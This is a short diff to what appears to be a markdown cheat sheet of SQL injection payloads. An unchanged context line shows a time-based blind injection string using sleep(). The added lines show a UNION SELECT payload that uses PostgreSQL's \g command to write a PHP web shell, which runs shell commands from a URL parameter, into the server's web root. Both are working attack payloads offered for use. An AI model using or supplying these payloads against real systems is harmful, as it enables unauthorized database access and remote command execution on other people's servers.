@@ -35,3 +35,8 @@
 ```sql
 'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
 ```
+
+## You can use the PostgreSQL \g command in your SQLi to create a file on the server. 
+```sql
+' UNION SELECT '<?php $out = shell_exec($_GET["x"]); echo "<pre>$out</pre>";?>' \g /var/www/test.php; --
+```
